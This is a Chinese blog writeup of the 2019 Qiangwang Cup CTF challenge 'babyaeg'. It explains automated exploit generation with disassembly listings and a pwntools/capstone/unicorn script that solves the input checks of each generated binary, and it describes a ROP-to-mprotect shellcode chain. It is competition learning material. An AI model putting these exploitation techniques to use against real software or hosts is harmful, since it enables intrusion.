---
title: 2019强网杯预选赛babyaeg writeup
date: 2019-05-27 10:35:51
tags: [pwn, ctf, "强网杯", "aeg"]
---
上周末参加了强网杯线上预选赛，和学长一起做了一道babyaeg。第一次接触aeg，写了一下解析的部分，还挺有意思的，感觉是一个很有趣的方向。
<!-- more -->
## 题目描述
连上这题会给你动态生成一个binary，然后读入任意长度的内容，但是要验证前`51+8`个字符，通过验证后才会将后面的内容memcpy到栈上。漏洞很简单，主要是怎么过前面`51+8`个字节的check，这个就比较复杂。因为每次连上都是不同的binary，同时有5秒的时间限制，我们需要写一个自动化生成payload的脚本才能实现动态解析。
## 题解
这里我们使用`capstone`和`unicorn`来实现aeg，其实可以用`angr`，但是我菜，不会，得学。首先观察前面48个字节的验证逻辑：
```
.text:000000000504A542                 push    rbp
.text:000000000504A543                 mov     rbp, rsp
.text:000000000504A546                 sub     rsp, 10h
.text:000000000504A54A                 mov     ecx, esi
.text:000000000504A54C                 mov     eax, edx
.text:000000000504A54E                 mov     edx, edi
.text:000000000504A550                 mov     [rbp+var_4], dl
.text:000000000504A553                 mov     edx, ecx
.text:000000000504A555                 mov     [rbp+var_8], dl
.text:000000000504A558                 mov     [rbp+var_C], al
.text:000000000504A55B                 cmp     [rbp+var_4], 0D4h
.text:000000000504A55F                 jnz     short loc_504A5C2 <======================= pos 1
.text:000000000504A561                 movzx   eax, [rbp+var_4]
.text:000000000504A565                 mov     edx, 46h
.text:000000000504A56A                 imul    eax, edx
.text:000000000504A56D                 sub     al, [rbp+var_8]
.text:000000000504A570                 cmp     al, 4Dh
.text:000000000504A572                 jnz     short loc_504A5C2 <======================= pos 2
.text:000000000504A574                 movzx   edx, [rbp+var_4]
.text:000000000504A578                 mov     eax, edx
.text:000000000504A57A                 shl     eax, 2
.text:000000000504A57D                 add     eax, edx
.text:000000000504A57F                 shl     eax, 2
.text:000000000504A582                 lea     ecx, [rax+rdx]
.text:000000000504A585                 movzx   edx, [rbp+var_8]
.text:000000000504A589                 mov     eax, edx
.text:000000000504A58B                 add     eax, eax
.text:000000000504A58D                 add     eax, edx
.text:000000000504A58F                 shl     eax, 4
.text:000000000504A592                 add     eax, ecx
.text:000000000504A594                 sub     al, [rbp+var_C]
.text:000000000504A597                 cmp     al, 3Bh
.text:000000000504A599                 jnz     short loc_504A5C2 <======================= pos 3
.text:000000000504A59B                 movzx   eax, cs:byte_524DF80+5
.text:000000000504A5A2                 movzx   edx, al
.text:000000000504A5A5                 movzx   eax, cs:byte_524DF80+4
.text:000000000504A5AC                 movzx   ecx, al
.text:000000000504A5AF                 movzx   eax, cs:byte_524DF80+3
.text:000000000504A5B6                 movzx   eax, al
.text:000000000504A5B9                 mov     esi, ecx
.text:000000000504A5BB                 mov     edi, eax
.text:000000000504A5BD                 call    sub_504A4C4
```
关注几个`jnz`的地方，我们需要的到符合判断条件的结果，因此可以反推初始状态下应该是啥。前48个字节的判断很好做，直接定位`jnz`然后符号执行。接下来3个字节与前面48个字节的处理方式不一样。我们以第49个字节的判断为例：
```
.text:0000000005049D40                 push    rbp
.text:0000000005049D41                 mov     rbp, rsp
.text:0000000005049D44                 sub     rsp, 50h
.text:0000000005049D48                 mov     [rbp+var_48], rdi
.text:0000000005049D4C                 mov     rax, [rbp-48h]
.text:0000000005049D50                 sub     rax, 30h
.text:0000000005049D54                 mov     [rbp+var_4], eax
.text:0000000005049D57                 mov     [rbp+var_20], 0
.text:0000000005049D5E                 mov     [rbp+var_1C], 1
.text:0000000005049D65                 mov     [rbp+var_18], 3
.text:0000000005049D6C                 mov     [rbp+var_14], 2
.text:0000000005049D73                 mov     [rbp+var_10], 4
.text:0000000005049D7A                 mov     [rbp+var_40], 8
.text:0000000005049D81                 mov     [rbp+var_3C], 9
.text:0000000005049D88                 mov     [rbp+var_38], 6
.text:0000000005049D8F                 mov     [rbp+var_34], 5
.text:0000000005049D96                 mov     [rbp+var_30], 7
.text:0000000005049D9D                 mov     ecx, [rbp+var_4]
.text:0000000005049DA0                 mov     edx, 66666667h
.text:0000000005049DA5                 mov     eax, ecx
.text:0000000005049DA7                 imul    edx
.text:0000000005049DA9                 sar     edx, 1
.text:0000000005049DAB                 mov     eax, ecx
.text:0000000005049DAD                 sar     eax, 1Fh
.text:0000000005049DB0                 sub     edx, eax
.text:0000000005049DB2                 mov     eax, edx
.text:0000000005049DB4                 shl     eax, 2
.text:0000000005049DB7                 add     eax, edx
.text:0000000005049DB9                 sub     ecx, eax
.text:0000000005049DBB                 mov     eax, ecx
.text:0000000005049DBD                 mov     [rbp+var_8], eax
.text:0000000005049DC0                 mov     eax, [rbp-8]
.text:0000000005049DC3                 cdqe
.text:0000000005049DC5                 mov     eax, [rbp+rax*4-20h]
.text:0000000005049DC9                 cdqe
.text:0000000005049DCB                 mov     eax, [rbp+rax*4-40h]
.text:0000000005049DCF                 cmp     eax, 6
.text:0000000005049DD2                 jnz     short loc_5049DE6 <===========================pos 1
.text:0000000005049DD4                 movzx   eax, cs:byte_524DF80+31h
.text:0000000005049DDB                 movzx   eax, al
.text:0000000005049DDE                 mov     rdi, rax
.text:0000000005049DE1                 call    sub_5049BF1
```

同样注意`jnz`,发现之前都是对读入的值经过一系列的运算的到了结果，这里我们直接爆破一些，从`mov     [rbp+var_48], rdi`这一句开始执行，爆破`rdi`即可得到这里应该是啥。最后8字节是通过读取rodata段上某个地址的值来验证的，我们也解析一下语句去读一下就好了。此外还有一些需要动态处理的数据如最后一个函数的栈帧大小，`main`函数的地址，`bss`段的地址。全部都解析完了之后直接rop用mprotect使存shellcode的地方可写然后跳到shellcode即可。exp及其难看。

解析代码如下:
```python
#! /usr/bin/env python2
# Author: 850

from pwn import *
import os
from capstone import *
from unicorn import *
from unicorn.x86_const import *
import ctypes
"""
pwn script framework
"""


class BASE(object):
    def __init__(self, remote_host, remote_port, local_elf, gdb_script, _remote_libc, _local_libc, _log_level):
        """
        initial basic paramaters
        """
        self.rhost = remote_host
        self.rport = remote_port
        self.elf_name = local_elf
        self.gdb_scripts = gdb_script
        self.local_libc = _local_libc
        self.remote_libc = _remote_libc
        context(os='linux', log_level=_log_level)
        context(terminal=["xfce4-terminal", "-e"])

    def local_debug(self, gdb_attach):
        """
        debug with GDB
        """
        self.target = process(self.elf_name)
        self.elf = ELF(self.elf_name)
        self.libc = ELF(self.local_libc)
        if gdb_attach:
            gdb.attach(self.target, gdbscript=self.gdb_scripts)

    def remote_attack(self,):
        """
        remote exploit
        """
        self.libc = ELF(self.remote_libc)
        self.target = remote(self.rhost, self.rport)
        self.elf = ELF(self.elf_name)

    def run(self,):
        self.local_debug(gdb_attach=False)
        # self.remote_attack()
        with open(self.elf_name, 'r') as f:
            bytecode = f.read()
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        offset = self.elf.vaddr_to_offset(self.elf.entrypoint)
        disasm_result = md.disasm(
            bytecode[offset:offset + 0x100], self.elf.entrypoint)
        for i in disasm_result:
            # print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
            if "rdi" in i.op_str:
                main_addr = int(i.op_str[i.op_str.find(",") + 2:], 16)
            elif "rcx" in i.op_str:
                init_addr = int(i.op_str[i.op_str.find(",") + 2:], 16)
        offset = self.elf.vaddr_to_offset(main_addr)
        disasm_result = list(
            md.disasm(bytecode[offset:offset + 0x1000], main_addr))
        count = 8
        xor_value = []
        for i in range(len(disasm_result)):
            if disasm_result[i].mnemonic == "call":
                count -= 1
                if count == 0:
                    first_func_start = int(disasm_result[i].op_str, 16)
        count = 2
        for i in range(len(disasm_result)):  
            if disasm_result[i].mnemonic == "xor":
                xor_value.append(int(disasm_result[i].op_str[disasm_result[i].op_str.find(",") + 2:], 16))
                count -= 1
                if count == 0:
                    break
        count = 0
        for i in range(len(disasm_result)):
            if disasm_result[i].mnemonic == "lea":
                count += 1
                if count == 4:
                    # print("0x%x:\t%s\t%s" %(disasm_result[i].address, disasm_result[i].mnemonic, disasm_result[i].op_str))                    
                    tmp = int(disasm_result[i].op_str[disasm_result[i].op_str.find("+") + 2:-1], 16)
                    fuck_addr = tmp+disasm_result[i+1].address
                    break
        print hex(fuck_addr)
        """
            find address of main() and 1st function
        """
        def get_end(start_addr):
            offset = self.elf.vaddr_to_offset(start_addr)
            disasm_result = md.disasm(
                bytecode[offset:offset + 0x1000], start_addr)
            for i in disasm_result:
                if i.mnemonic == 'ret':
                    return i.address

        array_result = []
        mu = Uc(UC_ARCH_X86, UC_MODE_64)
        mu.mem_map(0x400000, 1024 * 1024)
        mu.mem_map(0, 1024 * 1024)

        def get_answer(current_start):
            start_addr = self.elf.vaddr_to_offset(current_start)
            end_addr = self.elf.vaddr_to_offset(get_end(current_start)) + 1
            disasm_result = md.disasm(
                bytecode[start_addr:end_addr], current_start)
            disasm_result = list(disasm_result)
            tmp = []
            for i in range(len(disasm_result)):
                if disasm_result[i].mnemonic == "cmp":
                    tmp.append(
                        ctypes.c_uint8(int(disasm_result[i].op_str[disasm_result[i].op_str.find(",") + 2:], 16)).value)
            count = 0
            for i in range(len(disasm_result)):
                if disasm_result[i].mnemonic == 'jne':
                    if count == 0:
                        calc_start = i + 1
                    elif count == 1:
                        calc_end = i
                    count += 1
            calc_code = bytecode[self.elf.vaddr_to_offset(
                disasm_result[calc_start].address):self.elf.vaddr_to_offset(disasm_result[calc_end].address)]
            # print calc_code.encode('hex')

            mu.mem_write(0x400000, calc_code)
            mu.reg_write(UC_X86_REG_RBP, 0xc)
            mu.mem_write(0, p32(0) + p32(0) + p32(tmp[0]))
            mu.emu_start(0x400000, 0x400000 + len(calc_code))

            # print mu.reg_read(UC_X86_REG_AL)-59
            # print tmp
            # for i in range(calc_start, calc_end):
            #     print("0x%x:\t%s\t%s" % (
            #         disasm_result[i].address, disasm_result[i].mnemonic, disasm_result[i].op_str))
            tmp[1] = ctypes.c_uint8(int(mu.reg_read(UC_X86_REG_AL) - tmp[1])).value

            count = 0
            for i in range(len(disasm_result)):
                if disasm_result[i].mnemonic == 'jne':
                    if count == 1:
                        calc_start = i + 1
                    elif count == 2:
                        calc_end = i
                    count += 1
            calc_code = bytecode[self.elf.vaddr_to_offset(
                disasm_result[calc_start].address):self.elf.vaddr_to_offset(disasm_result[calc_end].address)]

            mu.mem_write(0x400000, calc_code)
            mu.reg_write(UC_X86_REG_RBP, 0xc)
            mu.mem_write(0, p32(0) + p32(tmp[1]) + p32(tmp[0]))
            mu.emu_start(0x400000, 0x400000 + len(calc_code))
            tmp[2] = ctypes.c_uint8(int(mu.reg_read(UC_X86_REG_AL) - tmp[2])).value

            for i in range(len(disasm_result)):
                if disasm_result[i].mnemonic == 'call':
                    return int(disasm_result[i].op_str, 16), tmp
        next_addr = first_func_start
        for i in range(48 / 3):
            next_addr, array_ans_3 = get_answer(next_addr)
            for j in array_ans_3:
                array_result.append(j)

        """
        stage1 end
        """
        def last_3(current_start):
            calc_code = bytecode[self.elf.vaddr_to_offset(current_start):self.elf.vaddr_to_offset(get_end(current_start))]
            disasm_result = list(md.disasm(calc_code, current_start))
            for i in range(len(disasm_result)):
                if "rdi" in disasm_result[i].op_str:
                    calc_start = disasm_result[i].address
                    break
            for i in range(len(disasm_result)):
                if disasm_result[i].mnemonic == "cmp":
                        # print hex(disasm_result[i].address)
                        tmp = ctypes.c_uint8(int(disasm_result[i].op_str[disasm_result[i].op_str.find(",") + 2:], 16)).value
                        calc_end = disasm_result[i].address
                elif disasm_result[i].mnemonic == "call":
                    next_addr = int(disasm_result[i].op_str, 16)
            calc_code = bytecode[self.elf.vaddr_to_offset(calc_start):self.elf.vaddr_to_offset(calc_end)]

            disasm_result = list(md.disasm(calc_code, calc_start))

            mu.mem_write(0x400000, calc_code)
            mu.reg_write(UC_X86_REG_RBP, 1024*1024)
            ans = 0x100
            for i in range(0x100):
                mu.reg_write(UC_X86_REG_RDI, i)
                mu.reg_write(UC_X86_REG_RBP, 1024*1024)
                mu.emu_start(0x400000, 0x400000 + len(calc_code))      
                if mu.reg_read(UC_X86_REG_EAX) == tmp:
                    return next_addr, i
        
        for i in range(3):
            next_addr, ans = last_3(next_addr)
            array_result.append(ans)

        calc_code = bytecode[self.elf.vaddr_to_offset(next_addr):self.elf.vaddr_to_offset(get_end(next_addr))]
        disasm_result = list(md.disasm(calc_code, next_addr))
        count = 0
        for i in range(len(disasm_result)):
            if disasm_result[i].mnemonic == "lea":
                count += 1
                if count == 2:
                    tmp = int(disasm_result[i].op_str[disasm_result[i].op_str.find("+") + 2:-1], 16)
                    str_addr = self.elf.vaddr_to_offset(tmp+disasm_result[i+1].address)
                    break
        array_result.append(bytecode[str_addr:str_addr+8])
        buffer_size = ctypes.c_uint8(int(disasm_result[2].op_str[disasm_result[2].op_str.find(",") + 2:], 16)).value
        print hex(buffer_size)
        return array_result, buffer_size, xor_value, fuck_addr

solve = BASE(
    remote_host="49.4.26.104",
    remote_port=32428,
    local_elf="./aeg0",
    _remote_libc="/lib64/libc.so.6",
    _local_libc="/lib64/libc.so.6",
    gdb_script="",
    _log_level="info"
)
print solve.run()
```